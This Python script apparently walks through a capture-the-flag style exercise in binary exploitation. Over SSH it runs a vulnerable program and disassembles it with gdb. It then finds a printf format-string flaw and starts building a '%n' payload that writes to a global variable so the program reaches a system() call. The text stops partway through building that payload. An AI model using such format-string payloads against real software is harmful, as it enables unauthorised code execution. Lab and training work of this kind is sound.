import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, upload_to
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

stream = exec_stream(f'./{binary_name}', title='Simple execute binary', stdin=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output)
print_title('Nothing happened')
print_title('Debug Time')

func_info = exec(client, f'echo "info func" | gdb ./{binary_name} -q | egrep " v$| main$"', title='Get all functions')
print_output(func_info)
print_title('We have two entry points (main - 0x0804851a, v - 0x080484a4)')

main_structure = exec(client, f'echo "disass main" | gdb ./{binary_name} -q', title='Get main structure')
print_output(main_structure)
print_title('Main call function `v`')

p_structure = exec(client, f'echo "disass v" | gdb ./{binary_name} -q', title='Get V structure')
print_output(p_structure)
print_title('Read stdin and print it via printf, check variable at step +59 and cmp with 0x40 (64) '
            'if expression does not math, print stdin and exit else print text and call system, oks')
print_title('Try to find name of variable for cmp (0x804988c) (Step +54)? Got it')

output = exec(
    client, f'echo "info variables" | gdb ./{binary_name} -q -ex "set pagination off" | grep "0x0804988c"',
    title='Get V structure')
print_output(output)
print_title('Variable name - `m` at global scope')

print_title('We have a little more info about how binary works')
print_title('Test what we can do')
print_title('Program call printf and print our input, try to break it')

output = exec(client, f'echo "%n" | ./{binary_name}', title='Try to input format string modif', err=True)
print_output(output)
print_title("Oh no... Wait, oh yeah! Let's find the key!!!")
print_title("Out goal at write 64 at `m` variable for cmp condition")

script = 'print "\x8c\x98\x04\x08"+ "%4$n"'




